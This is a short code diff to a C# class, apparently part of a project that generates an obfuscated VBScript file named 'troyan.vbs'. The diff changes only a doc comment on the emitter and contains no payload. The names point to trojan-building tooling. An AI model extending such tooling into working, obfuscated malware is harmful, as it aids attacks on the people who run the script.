@@ -2,7 +2,7 @@ using Commons;
 
 namespace Troyan.Core;
 
-/// <summary>Writes <c>nonobfuscated.vbs</c> (raw) then final <c>troyan.vbs</c> via <see cref="ITroyanVbsObfuscator"/> (stub = copy).</summary>
+/// <summary>Writes <c>nonobfuscated.vbs</c> (raw) then final <c>troyan.vbs</c> via <see cref="ITroyanVbsObfuscator"/>.</summary>
 public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
 {
     private readonly ITroyanVbsObfuscator _obfuscator;
